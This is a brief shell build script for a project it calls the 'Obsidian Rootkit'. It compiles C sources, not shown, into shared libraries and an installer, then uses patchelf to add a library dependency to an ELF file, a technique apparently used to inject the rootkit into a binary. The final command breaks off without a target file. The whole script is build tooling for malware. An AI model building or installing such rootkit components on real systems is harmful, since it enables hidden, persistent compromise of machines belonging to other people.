echo "-----------------------------------------------"
echo "Building Obsidian Rootkit Project"
echo "-----------------------------------------------"
cc Obsidian_FR.c -fPIC -shared -o Obsidian_Shared.so
cc Obsidian_CR.c -fPIC -shared -o Obsidian_Shared_Main.so
cc ObsidianMD.c Obsidian_Shared_Main.so -o ObsidianInstaller -Wl,-rpath,'$ORIGIN'
echo "Finished Building, Now we need to patch the ELF file"
patchelf --add-needed ./Obsidian_Shared.so 
